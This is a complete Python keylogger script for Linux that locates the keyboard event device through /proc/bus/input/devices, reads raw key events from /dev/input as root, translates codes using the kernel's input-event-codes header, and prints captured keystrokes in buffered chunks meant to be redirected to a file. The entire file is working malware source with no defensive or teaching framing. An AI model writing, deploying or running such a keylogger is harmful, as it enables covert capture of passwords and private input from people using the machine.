#!/usr/bin/env python3

import sys
import re
import struct


BUF_SIZE = None

def main():
	qwerty_map = map_key_code()

	# read devices
	devices = open("/proc/bus/input/devices", "r")
	lines = devices.readlines()
	pattern = re.compile("Handlers|EV=")
	handlers = list(filter(pattern.search, lines))
	pattern = re.compile("EV=120013")
	for idx, elt in enumerate(handlers):
		if pattern.search(elt):
			line = handlers[idx - 1]
	pattern = re.compile("event[0-9]")
	infile_path = "/dev/input/" + pattern.search(line).group(0)
	devices.close()

	# read input
	FORMAT = 'llHHI'
	EVENT_SIZE = struct.calcsize(FORMAT)
	in_file = open(infile_path, "rb")
	event = in_file.read(EVENT_SIZE)
	typed = ""
	while event:
		(_, _, type, code, value) = struct.unpack(FORMAT, event)
		if code != 0 and type == 1 and value == 1:
			code_str = str(code)
			if code_str in qwerty_map:
				typed += qwerty_map[code_str]
		if len(typed) > BUF_SIZE:
			print("Keylogger: " + typed)
			typed = ""
		event = in_file.read(EVENT_SIZE)
	in_file.close()
	return True


def parse_custom_case(data, exp):
	regex = re.compile(exp, re.MULTILINE | re.IGNORECASE)
	return regex.findall(data)


def map_key_code():
	arr = {}
	file = open("/usr/include/linux/input-event-codes.h", "r")
	lines = file.readlines()
	file.close()
	for line in lines:
		if line.startswith("#define KEY_") > 0:
			key_name = parse_custom_case(line.strip(), "key_[^\t]+")
			key_code = parse_custom_case(line.strip(), "\t+[^\s]+")
			if key_name and key_code:
				arr[key_code[0].strip()] = key_name[0].strip()
	return arr


def usage():
	print("Usage : sudo python3 keylogger.py [buffer_size] > keylogger.txt") # noqa


def init_arg():
	if len(sys.argv) < 2:
		usage()
		exit()
	global BUF_SIZE
	BUF_SIZE = int(sys.argv[1])


if __name__ == "__main__":
	init_arg()
	main()